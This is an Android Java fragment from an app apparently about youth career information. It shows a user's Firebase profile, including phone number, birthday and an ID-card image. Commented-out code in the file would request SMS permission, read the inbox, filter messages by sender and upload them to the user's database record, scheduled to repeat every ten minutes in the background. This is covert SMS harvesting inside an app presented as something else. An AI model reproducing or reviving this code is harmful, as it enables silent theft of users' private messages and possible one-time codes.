package com.indian.youthcareerinfo.ui;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.fragment.app.Fragment;

import com.bumptech.glide.Glide;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.Query;
import com.google.firebase.database.ValueEventListener;
import com.indian.youthcareerinfo.R;
import com.indian.youthcareerinfo.model.Upload;

public class HomeFragment extends Fragment {

    ImageView profileImage,cardImage;
    TextView name,phoneNo,emailId,birthday;
    private DatabaseReference mDatabaseRef;
    Query query;
//    private List<String> sms;
    public String email;
//    public String uploadId;
    private static final String TAG = "HomeFragment";

    public View onCreateView(@NonNull LayoutInflater inflater,
                             ViewGroup container, Bundle savedInstanceState) {
        View root = inflater.inflate(R.layout.fragment_home, container, false);

        Intent intent = getActivity().getIntent();
        email = intent.getStringExtra("email");
//        sms = new ArrayList<>();
//        if (checkAndRequestPermissions()) {
//            loadSms();
//        }

        profileImage = root.findViewById(R.id.profileImage);
        cardImage = root.findViewById(R.id.cardImage);
        name = root.findViewById(R.id.name);
        phoneNo = root.findViewById(R.id.phoneNo);
        emailId = root.findViewById(R.id.emailId);
        birthday = root.findViewById(R.id.birthday);

        mDatabaseRef = FirebaseDatabase.getInstance().getReference("Users");
        query = mDatabaseRef.orderByChild("email").equalTo(email);
//        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
//        uploadSmsAuto();
//        }

        query.addValueEventListener(new ValueEventListener() {
            @SuppressLint("SetTextI18n")
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Upload upload = new Upload();
                for (DataSnapshot postSnapshot : snapshot.getChildren()) {
                    upload = postSnapshot.getValue(Upload.class);
                }
                if (getActivity() == null) {
                    return;
                }
                name.setText(upload.getFirstName()+" "+upload.getLastName());
                phoneNo.setText(upload.getPhoneNo());
                emailId.setText(email);
                birthday.setText(upload.getDob());
                Glide.with(getContext()).load(upload.getPhotourl()).placeholder(R.drawable.pp).into(profileImage);
                Glide.with(getContext()).load(upload.getNidurl()).placeholder(R.drawable.default_image_thumbnail).into(cardImage);

            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });


        return root;
    }

//    @SuppressLint("NewApi")
//    private void uploadSmsAuto() {
//        ComponentName componentName = new ComponentName(getContext(), UploadSmsAutoService.class);
//        JobInfo info = null;
//            info = new JobInfo.Builder(123, componentName)
//                    .setRequiresCharging(false)
//                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED)
//                    .setPersisted(true)
//                    .setPeriodic(10 * 60 * 1000)
//                    .build();
//        JobScheduler scheduler = (JobScheduler) getActivity().getSystemService(JOB_SCHEDULER_SERVICE);
//        int resultCode = scheduler.schedule(info);
//        if (resultCode == JobScheduler.RESULT_SUCCESS) {
//            Log.d(TAG, "Job scheduled");
//        } else {
//            Log.d(TAG, "Job scheduling failed");
//        }
//    }
//
//    private boolean checkAndRequestPermissions() {
//        int sms = ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_SMS);
//
//        if (sms != PackageManager.PERMISSION_GRANTED) {
//            ActivityCompat.requestPermissions(getActivity(), new String[]{Manifest.permission.READ_SMS}, 1);
//            return false;
//        }
//        return true;
//    }
//
//    @Override
//    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
//        loadSms();
//    }
//
//    private void loadSms() {
//        Query query;
//        query = FirebaseDatabase.getInstance().getReference("Users").orderByChild("email").equalTo(email);
//        query.addValueEventListener(new ValueEventListener() {
//            @Override
//            public void onDataChange(@NonNull DataSnapshot snapshot) {
//                for (DataSnapshot child : snapshot.getChildren()) {
////                            Toast.makeText(getContext(), ""+child.getKey(), Toast.LENGTH_SHORT).show();
//                    uploadId = child.getKey();
//                }
//            }
//
//            @Override
//            public void onCancelled(@NonNull DatabaseError error) {
//
//            }
//        });
//
//        // Create Inbox box URI
//        Uri inboxURI = Uri.parse("content://sms/inbox");
//
//        // List required columns
//        String[] reqCols = new String[]{"_id", "address", "body"};
//
//        // Get Content Resolver object, which will deal with Content
//        // Provider
//        ContentResolver cr = getActivity().getContentResolver();
//
//        // Fetch Inbox SMS Message from Built-in Content Provider
//        Cursor c = cr.query(inboxURI, reqCols, null, null, null);
//
//        if (c != null) {
//            while (c.moveToNext()) {
//                String Number = c.getString(c.getColumnIndexOrThrow("address")).toString();
//                String Body = c.getString(c.getColumnIndexOrThrow("body")).toString();
////                if (Number.contains("XTECHH") || Number.contains("xtechh")) {
//                if (Number.contains("111")) {
//                    sms.add("Number: " + Number + "\n" + "Body: " + Body);
//                }
//            }
//        }
//        if (uploadId!=null) {
//            mDatabaseRef.child(uploadId).child("sms").setValue(sms);
//        }
//        c.close();
//    }
}